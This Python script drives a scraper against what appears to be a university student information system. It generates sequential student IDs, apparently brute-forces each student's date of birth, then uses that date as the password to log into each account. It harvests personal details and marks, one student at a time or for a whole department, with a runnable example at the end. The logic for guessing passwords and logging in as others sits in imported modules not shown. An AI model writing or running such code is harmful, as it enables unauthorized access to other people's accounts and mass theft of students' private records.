from exam import ExamScraper, gen_payload as exam_pl
from sis import SisScraper, gen_payload as sis_pl, CACHE_NAME
from scraper import gen_usn, roll_range, set_cache


def stats_dept(year, dept, start=1, stop=None, dobs: dict[int, str] = None, lite=False):
	if dobs is None: dobs = {}
	with SisScraper() as SIS:
		pl = sis_pl()
		tol = 4
		for i in roll_range(start, stop):
			if tol <= 0: return
			pl["username"] = gen_usn(year, dept, i)

			# === dob worker
			if i not in dobs:
				dob = SIS.get_dob(pl['username'])
			else:
				dob = dobs[i]
			if dob is None:
				tol -= 1
				continue
			tol = 4
			if i % 5 == 0: set_cache(CACHE_NAME, SIS.brute_year)

			# === meta worker
			pl["passwd"] = dob
			meta = SIS.get_meta(pl)

			# === marks worker
			marks = SIS.get_marks(lite)

			yield meta, marks


def stats_i(year, dept, i, dob=None, lite=False):
	with SisScraper() as SIS:
		pl = sis_pl()
		pl['username'] = gen_usn(year, dept, i)

		# === dob worker
		if dob is None: dob = SIS.get_dob(pl['username'])
		if dob is None: return {}

		# === meta worker
		pl["passwd"] = dob
		meta = SIS.get_meta(pl)

		# === marks worker
		marks = SIS.get_marks(lite)

	return meta, marks


if __name__ == '__main__':
	YEAR = "21"
	DEPT = "IS"

	"""
	if lite is true, minimal information is given and is faster
	"""

	# === single usn example
	m1, m2 = stats_i(YEAR, DEPT, 1, lite=True)
	print(m1, m2)

	# === dept usn example
	# for m1, m2 in stats_dept(YEAR, DEPT, lite):
	# 	print(m1)
